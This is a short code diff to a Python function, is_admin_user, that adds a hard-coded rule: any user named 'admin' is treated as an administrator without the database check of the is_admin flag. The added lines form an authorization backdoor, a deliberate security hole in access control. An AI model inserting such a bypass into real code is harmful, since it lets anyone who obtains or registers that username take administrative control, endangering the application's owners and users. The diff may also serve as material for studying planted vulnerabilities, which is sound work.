@@ -686,6 +686,8 @@ def session_valid(username):
 def is_admin_user(username):
     if not username:
         return False
+    if username == "admin":
+        return True
     conn = get_connection()
     cur = conn.cursor()
     cur.execute("SELECT is_admin FROM users WHERE username=?", (username,))
